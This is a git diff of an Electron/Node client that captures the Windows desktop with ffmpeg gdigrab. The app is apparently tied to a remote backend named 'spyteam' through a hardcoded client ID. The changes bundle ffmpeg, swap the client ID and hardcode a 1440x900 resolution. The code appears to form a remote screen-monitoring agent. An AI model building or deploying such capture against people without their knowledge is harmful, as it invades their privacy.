@@ -4,10 +4,16 @@ import http from "http";
 import { io as socketIo } from "socket.io-client";
 import os from "os";
 import { app, screen, powerMonitor } from "electron";
-
+import path from "path";
+import { fileURLToPath } from "url";
 
 // 📦 Import du helper
 import helperModule from "./helper/helper.js";
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+let ffmpegPath = path.join(process.resourcesPath ,"ffmpeg","bin","ffmpeg.exe")
+
 const helper = helperModule.default || helperModule;
 
 const appli = express();
@@ -16,8 +22,8 @@ let io;
 const PORT = 9000;
 
 const serveurBackend = "https://api.spyteam.fr";
-//const serveurBackend = "http://192.168.1.177:4000";
-let idClient = "67fcf73fa28e6ec677fe2e95";
+//const serveurBackend = "http://192.168.1.197:5000";
+let idClient = "6801eff6d6a8b44364d819e3";
 
 let fileName = helper.generateFileName(idClient);
 let dateFolder = helper.generateDate();
@@ -79,7 +85,7 @@ function startCapture() {
   setTimeout(() => {
     const platform = os.platform();
     if (platform == "win32") {
-       ffmpeg = spawn("ffmpeg", [
+       ffmpeg = spawn(ffmpegPath, [
         "-f",
         "gdigrab",
         "-r",
@@ -109,7 +115,7 @@ function startCapture() {
         "pipe:1",
       ]);
 
-      ffmpegImg = spawn("ffmpeg", [
+      ffmpegImg = spawn(ffmpegPath, [
         "-f",
         "gdigrab",
         "-framerate",
@@ -237,13 +243,15 @@ app.whenReady().then(() => {
     totalHeight = Math.max(totalHeight, display.bounds.height);
   });
   if (totalWidth > 3840) {
-    if (totalWidth % 2 !== 0) {
+    /* if (totalWidth % 2 !== 0) {
       totalWidth = roundToEven(totalWidth);
     }
 
     if (totalHeight % 2 !== 0) {
       totalHeight = roundToEven(totalHeight);
-    }
+    } */
+    totalWidth=1440
+    totalHeight=900
   }
   resolution = `${totalWidth}:${totalHeight}`;
 
